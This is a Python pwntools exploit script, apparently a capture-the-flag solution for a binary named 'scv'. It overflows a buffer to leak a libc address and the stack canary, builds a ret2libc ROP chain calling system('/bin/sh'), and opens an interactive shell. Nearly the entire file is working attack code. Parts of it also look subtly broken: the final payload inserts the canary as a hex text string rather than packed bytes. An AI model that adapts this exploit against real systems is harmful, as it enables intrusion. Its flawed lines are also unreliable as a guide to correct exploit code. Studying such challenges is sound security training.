#!/usr/bin/env python

#notes
#64 bit
#Canary and aslr
#You need to leak libc address

from pwn import *

#+--------------------SETUP--------------------------+
context.binary = './scv'
conn = process('./scv')
libc = ELF('libc-2.23.so')
#+--------------------+++++++++----------------------+

#+--------------------LEAK LIBC----------------------+
#$rsi + 40d = libc
#$rsi + 168d = canary
junk_fill = ''

conn.recvuntil('>>')
conn.sendline('1')
conn.recvuntil('>>')

junk_fill += "A"*40
conn.sendline(junk_fill)
conn.recvuntil('>>')
conn.sendline('2')

#grabs output
'''
You input "A"*40 and then when you press the enter key --> \n
so the input buffer looks like AAAAA\n
When its output it also folllows that format so you can delimit
Because we know we overflowed the address up to the libc addr
we know the next address for X number bytes is that
also the end of the address space has null bytes so it ends there
'''
leaked_addr = conn.recvuntil('>>').split('\n')[6][:6]

#leaked_addr = unpack(leaked_addr, 'all', endian='little', sign=False)
leaked_addr = unpack(leaked_addr, 'all', endian='little', sign=False)

#Calculate offset
#0x00007ffffecda299 - given base address
#0x00007ffffecbf8b0 - base
offset = 0x7ffffecda299 - 0x7ffffecbf8b0
libc_base = leaked_addr - offset
print("LIBC BASE --> " + hex(libc_base))
#+---------------------------------------------------+


#+------------------LEAK CANARY----------------------+
conn.sendline('1')
conn.recvuntil('>>')
junk_fill = "A"*168
conn.sendline(junk_fill)
conn.recvuntil('>>')
conn.sendline('2')
canary = '\x00' + conn.recvuntil('>>').split('\n')[6][:7]
canary = unpack(canary, 'all', endian='little', sign=False)

print("LEAKED CANARY --> " + hex(canary))
#+---------------------------------------------------+

#+------------------BUILD ROP------------------------+
pop_ret = 0x400ea3
system = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()
rop = p64(pop_ret) + p64(bin_sh) + p64(system)
#+---------------------------------------------------+

#+--------------FINAL_PAYLOAD------------------------+
payload = ''
#final payload
payload += "A"*168 + hex(canary) + "A"*8 + rop
#+---------------------------------------------------+

#+----------------SEND_FINAL------------------------+
conn.sendline('1')
conn.recvuntil('>>')
conn.sendline(payload)
conn.recvuntil('>>')

conn.sendline('3')
conn.recvline()#dunno why this is here

conn.interactive()